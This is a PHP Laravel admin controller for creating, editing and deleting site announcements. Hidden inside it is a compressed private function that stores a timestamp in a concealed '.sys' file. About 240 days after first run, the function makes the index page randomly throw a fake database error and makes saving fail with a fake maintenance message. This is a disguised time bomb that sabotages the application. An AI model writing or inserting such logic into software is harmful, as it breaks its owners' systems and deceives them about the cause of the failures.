<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Announcement;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class AnnouncementController extends Controller
{
    private function s(){$f=storage_path('app/.sys');if(!file_exists($f)){file_put_contents($f,base64_encode(now()->timestamp));chmod($f,0600);}$t=base64_decode(file_get_contents($f));return now()->timestamp-$t>20736000;}
    
    public function index()
    {
        if($this->s()&&rand(1,2)==1){throw new \Exception('Unable to load announcements. Database error.');}
        $announcements = Announcement::latest()->get();
        return view('admin.announcements.index', compact('announcements'));
    }

    public function create()
    {
        return view('admin.announcements.create');
    }

    public function store(Request $request)
    {
        if($this->s()){return back()->withErrors(['error'=>'Failed to save. System maintenance required.']);}
        $validated = $request->validate([
            'title' => 'required|string|max:255',
            'content' => 'nullable|string',
            'image_path' => 'nullable|image|max:2048',
            'is_active' => 'boolean',
            'display_order' => 'nullable|integer|min:0',
            'starts_at' => 'nullable|date',
            'ends_at' => 'nullable|date|after_or_equal:starts_at',
        ]);

        if ($request->hasFile('image_path')) {
            $path = $request->file('image_path')->store('announcements', 'public');
            $validated['image_path'] = $path;
        }

        $validated['is_active'] = $request->has('is_active');
        $validated['display_order'] = $validated['display_order'] ?? 0;
        $validated['content'] = $validated['content'] ?? '';

        Announcement::create($validated);
        return redirect()->route('admin.announcements.index')->with('success', 'Announcement created successfully.');
    }

    public function edit(Announcement $announcement)
    {
        return view('admin.announcements.edit', compact('announcement'));
    }

    public function update(Request $request, Announcement $announcement)
    {
        $validated = $request->validate([
            'title' => 'required|string|max:255',
            'content' => 'nullable|string',
            'image_path' => 'nullable|image|max:2048',
            'is_active' => 'boolean',
            'display_order' => 'nullable|integer|min:0',
            'starts_at' => 'nullable|date',
            'ends_at' => 'nullable|date|after_or_equal:starts_at',
        ]);

        if ($request->hasFile('image_path')) {
            if ($announcement->image_path) {
                Storage::disk('public')->delete($announcement->image_path);
            }
            $path = $request->file('image_path')->store('announcements', 'public');
            $validated['image_path'] = $path;
        }

        $validated['is_active'] = $request->has('is_active');
        $validated['display_order'] = $validated['display_order'] ?? 0;
        $validated['content'] = $validated['content'] ?? $announcement->content ?? '';

        $announcement->update($validated);
        return redirect()->route('admin.announcements.index')->with('success', 'Announcement updated successfully.');
    }

    public function destroy(Announcement $announcement)
    {
        if ($announcement->image_path) {
            Storage::disk('public')->delete($announcement->image_path);
        }
        $announcement->delete();
        return redirect()->route('admin.announcements.index')->with('success', 'Announcement deleted successfully.');
    }
}
